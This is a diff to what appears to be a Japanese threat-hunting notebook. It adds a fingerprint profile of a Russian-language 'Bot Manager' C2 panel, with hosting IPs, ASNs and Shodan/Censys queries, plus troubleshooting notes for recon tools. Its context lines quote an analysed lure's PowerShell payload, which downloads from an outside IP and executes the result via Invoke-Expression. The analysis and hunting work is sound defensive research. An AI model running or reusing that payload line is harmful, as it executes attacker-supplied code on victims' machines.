@@ -172,3 +172,33 @@
 - **ペイロード**: `iex([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('...')))` → `Invoke-WebRequest 'http://103.27.156.239/_/' -UseBasicParsing | Invoke-Expression`
 - **防御テクニック**: キーボード入力ブロック（Esc/F5/F12/Alt/Tab）、`beforeunload`でタブ離脱妨害、favicon除去
 - **解析のポイント**: `inline_0.js`にペイロード、`inline_2.js`にUI制御ロジック、`clipboard_captured.json`で実際のクリップボード書き込み値を確認
+
+## Bot Manager（露語C2パネル / 2026-04-17）
+- **初回観測**: `84.247.150.177:8000` (Contabo SG, AS141995), ThreatFox `IOC #1782694`、`whoamix302`報告 2026-04-08
+- **パネル識別子（fingerprint）**:
+  - HTML `<title>Login - Bot Manager</title>`
+  - ロシア語UI: `Пароль`（label）, `Войти`（button）, `Неверный пароль.`（エラー）, `Успешный вход`（JSコメント）
+  - `Server: Microsoft-HTTPAPI/2.0` → **Windows http.sys + .NET HttpListener** の独自サーバ
+  - Auth: `POST /api/login` with `{"password": "..."}` (ユーザー名フィールドなし)
+  - Unauth → 全パス `302 → /login.html`
+  - Login page size = 3637 bytes (2026-04-17時点)
+- **インフラパターン**:
+  - **VDSINA (NL, AS216071)** に 11+ノード集中。2026-03-31 に`Lenny_3BO`が一括登録
+  - Contabo SG / Lunanode CAは予備系
+  - 大半ポート 8080、一部 8000/443 で変更
+  - **IP-whitelisted C2**: 約半数が `FILTERED`（SYN drop）— 被害者ビーコンのみ受付
+- **検出クエリ**:
+  - Shodan: `http.html:"Login - Bot Manager"` / `asn:AS216071 port:8080 "Microsoft-HTTPAPI/2.0"`
+  - Censys: `services.http.response.html_title: "Login - Bot Manager"`
+- **教訓**:
+  - Russian-UI panels + .NETサーバ + VDSINAホスティングの組み合わせで独自C2を特定
+  - ThreatFoxタグ（`BotManager` / `bot-manager` / `VDSINA` / `AS216071`）で複数タグ横展開
+  - 到達不能IPもFILTEREDと判定し、DEADと混同しない（被害者からは見えている可能性）
+- **再現コマンド**: `python3 tools/proxy-web/intel/c2cluster.py profile --tag BotManager` で3秒で全ノードプロファイル
+
+## 偵察エラーと対策（2026-04-17調査から）
+- **ThreatFox `threatfox tag` は limit=10 ハードコードだった** → 2026-04-17 修正済み。`--limit N`（最大1000）が使える
+- **`curl` 直叩きで `query_status: None`**: Auth-Key ヘッダ必須。ABUSECH_AUTH_KEY 環境変数を設定し proxy-web 経由で叩く
+- **Docker未起動時の3回リトライでの連続失敗**: `proxy-web "URL"` は 2026-04-17 以降 preflight 自動実行（`--skip-preflight` で回避可）
+- **Tor SOCKS5 REFUSED**: ローカル tor が未起動。proxy-web の `--tor` は失敗してもフォールバックしない。Tor が必要な場合はドッカーTorコンテナを別途起動
+- **WebFetch は TI サイト（ThreatFox IOCページ等）では CAPTCHA に阻まれる** → API 直叩き or proxy-web 経由が必須
